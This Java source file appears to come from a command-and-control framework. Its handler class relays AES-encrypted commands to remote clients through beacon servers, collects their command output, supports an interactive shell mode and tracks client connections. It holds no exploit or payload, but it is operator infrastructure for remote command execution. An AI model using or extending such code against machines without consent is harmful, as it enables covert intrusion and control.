package Servers.C2;

import java.io.IOException;
import java.util.HashMap;

import Servers.Duplexer;
import Servers.keepAlive;
import Servers.encryption.aes.*;

public class C2ServerBeaconHandler implements Runnable{
    // IP address of the Long Range Becaon that this thread is handling
    public String IP;

    // Duplexer send and receive from the Long Range Beacon
    private Duplexer duplexer;

    // Pointer to the C2 Server
    private C2Server C2server;

    // Class and Thread that send a KEEP_ALIVE Messsage to the Beacon Server every 30 seconds to keep the socket open
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;
    private Object sendLock;

    // Variables used when the user is in shell mode
    private Boolean isShell;
    private Object shellLock;

    // Object used to encrypt with AES
    private aes aes;

    // Sentinel used for this thread to run
    private boolean sentinel;

    /**
     * Class used to create a new thread, to handle messages coming from an individual beacon to the C2 server
     * 
     * @param duplexer - duplexer used to write and read from the socket
     * @param IP - IP address of the beacon
     * @param server - pointer back to the C2 server
     * @param shellLock - Object lock, used to make responses in shell mode come back very quickly
     * @param aes - object used for encryption and decryption via aes
     */
    protected C2ServerBeaconHandler(Duplexer duplexer, String IP, C2Server server, Object shellLock, aes aes){
        this.duplexer = duplexer;
        this.IP = IP;
        this.C2server = server;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(duplexer, sendLock, true, false, aes);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.isShell = false;
        this.shellLock = shellLock;
        this.aes = aes;
        this.sentinel = true;
    }

    protected void setIsShell(Boolean value){
        this.isShell = value;
    }

    /**
     * Takes a JSON string, and parses it into a Java Hash Map
     * @param jsonString - JSON String to be parsed
     * @return - HashMap containing all values from the JSON String
     */
    public HashMap<String, String> parseJSONToHashMap(String jsonString) {
        HashMap<String, String> resultMap = new HashMap<>();
        
        // Remove outer braces
        jsonString = jsonString.trim().substring(1, jsonString.length() - 1);

        boolean inQuotes = false; // Flag to track if we're inside quotes
        StringBuilder keyBuilder = new StringBuilder();
        StringBuilder valueBuilder = new StringBuilder();
        String currentKey = null;
        boolean isParsingValue = false;

        for (int i = 0; i < jsonString.length(); i++) {
            char currentChar = jsonString.charAt(i);

            // Toggle inQuotes flag when encountering a quote
            if (currentChar == '"') {
                inQuotes = !inQuotes;
            } else if (!inQuotes && currentChar == ':') {
                // Switch to value parsing mode when outside quotes and a colon is found
                currentKey = keyBuilder.toString().trim();
                keyBuilder.setLength(0); // Clear key builder
                isParsingValue = true;
            } else if (!inQuotes && currentChar == ',') {
                // End of a key-value pair
                resultMap.put(currentKey.replaceAll("^\"|\"$", ""), valueBuilder.toString().trim().replaceAll("^\"|\"$", ""));
                valueBuilder.setLength(0); // Clear value builder
                isParsingValue = false;
            } else {
                // Append characters to the appropriate builder
                if (isParsingValue) {
                    valueBuilder.append(currentChar);
                } else {
                    keyBuilder.append(currentChar);
                }
            }
        }

        // Add the last key-value pair to the map
        if (currentKey != null) {
            resultMap.put(currentKey.replaceAll("^\"|\"$", ""), valueBuilder.toString().trim().replaceAll("^\"|\"$", ""));
        }

        return resultMap;
    }

    /**
     * Sends a message to the Long Range Beacon Server from the C2 Server
     * 
     * @param message
     */
    protected void sendToBeacon(String message){
        synchronized(sendLock){
            duplexer.send(aes.encrypt(message), true);
        }
    }

    /**
     * Used to Take all necessary actions when a beacon disconnects 
     * @param e - Error message to print
     */
    private void beaconDisconnect(Exception e){
        String errorMessage = "Lost Beacon Server at " + IP;
        C2server.outputToUserHandler(errorMessage);
        keepAliveClass.stopKeepAlive();
        this.sentinel = false;
        if(e != null){
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        try {
            keepAliveThread.start();
            while(sentinel){
                String response = aes.decrypt(duplexer.receive(true));
                if(!(response.equals("KEEP_ALIVE"))){
                    
                    HashMap<String, String> map = parseJSONToHashMap(response);
                    
                    if(map.get("type").equals("client_command_response")){
                        // When we get a response to a command, add it to the dictionaries
                        C2server.addDataToResponsesDictionaries(map.get("ip"), map.get("data"));
                        // If we are currently in a shell, notify the lock
                        if(isShell){
                            synchronized(shellLock){
                                shellLock.notify();
                            }   
                        }
                    } else if (map.get("type").equals("client_connect")) {
                        // When we are notified of a new client, intialize the varaibles, and notify the User that there is a new client
                        C2server.outputToUserHandler(map.get("data") + " at " + map.get("ip"));
                        C2server.intializeVars(map.get("ip"), map.get("data"));

                    } else if (map.get("type").equals("client_disconnect")){
                        // When we are notified of a client disconnect, notify the user that there is a new client
                        // and append a message to the end of the dictionaries
                        C2server.outputToUserHandler(map.get("data") + " at " + map.get("ip"));
                        C2server.addDataToResponsesDictionaries(map.get("ip"), "DISCONNECTED");
                    }
                }   
            }
        } catch (IOException e) {
            beaconDisconnect(e);
        } catch (NullPointerException e) {
            beaconDisconnect(e);
        } catch (NumberFormatException e){
            beaconDisconnect(e);
        }
    }
}
